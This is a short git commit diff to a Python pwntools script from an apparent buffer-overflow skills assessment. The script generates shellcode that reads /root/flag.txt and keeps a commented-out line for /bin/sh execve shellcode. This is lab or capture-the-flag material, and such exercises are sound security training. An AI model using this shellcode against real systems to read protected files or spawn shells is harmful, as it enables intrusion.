cb71d583b76ea29c94f2c3caed12fead40ea94cf
Collin Andrews <179949844+Collinformatics@users.noreply.github.com>
2026-05-15 23:02:18 -0500

    Add files via upload

--- SkillsAssessment/Stack-Based Buffer Overflows on Linux x86/shellcode.py
+++ SkillsAssessment/Stack-Based Buffer Overflows on Linux x86/shellcode.py
@@ -4,10 +4,12 @@ from pwn import *
 
 context(os="linux", arch="amd64", log_level="error")
 
-# Syscall and args 
-syscall = pwnlib.shellcraft.amd64.linux.cat('flag.txt')
+# Syscall and args
+# syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh']) 
+syscall = pwnlib.shellcraft.amd64.linux.cat('/root/flag.txt')
 
 # Generate shellcode
-sc = asm(syscall).hex() 
-print(f'Shellcode contains N bytes: {len(sc) // 2}\n')
-print(sc)
+sc = asm(syscall)
+print(f'Shellcode contains N bytes: {len(sc)}\n')
+print(f'{sc}\n')
+print(sc.hex())
